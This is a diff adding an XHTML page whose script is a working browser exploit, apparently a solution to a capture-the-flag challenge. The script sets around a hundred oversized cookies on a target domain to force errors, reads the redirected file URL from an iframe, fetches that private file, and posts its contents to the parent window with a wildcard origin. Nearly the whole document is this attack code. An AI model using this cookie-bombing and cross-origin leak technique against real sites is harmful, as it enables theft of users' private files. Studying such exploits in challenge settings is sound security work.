@@ -1,0 +1,42 @@
+<div xmlns="http://www.w3.org/1999/xhtml">
+  <iframe></iframe>
+  <script>
+      var sleep = d => new Promise(r => setTimeout(r));
+
+      function cookieBomb() {
+          for (let i = 100; i--;) {
+              document.cookie = `a${i}=${'a'.repeat(1000)};Domain=.secdrivencontent.dev;SameSite=none;Secure;Path=/`
+          }
+      }
+
+      function deleteCookies() {
+          for (let i = 100; i--;) {
+              document.cookie = `a${i}=${'a'.repeat(1000)};Domain=.secdrivencontent.dev;expires=Thu, 01 Jan 1970 00:00:00 GMT;SameSite=none;Secure;Path=/`
+          }
+      }
+
+      function getFile(url) {
+          cookieBomb();
+          var x = document.all[1];
+          let counter = 0;
+          x.onload = x.onerror = () => {
+              if (counter === 0) {
+                  counter++;
+                  deleteCookies();
+                  const url = x.contentWindow.location.href;
+                  setTimeout(cookieBomb, 1);
+                  x.src = url;
+              } else if (counter === 1) {
+                  deleteCookies();
+                  const file_url = x.contentWindow.location.href;
+                  fetch(file_url).then(e => e.text()).then(e=>{
+                    parent.postMessage(e,'*');
+                  });
+              }
+          }
+          x.src = url;
+      }
+      const file_to_leak = (new URL(location)).searchParams.get('url') || 'https://chall.secdriven.dev/file?id=133711377731'
+      getFile(file_to_leak)
+  </script>
+</div>
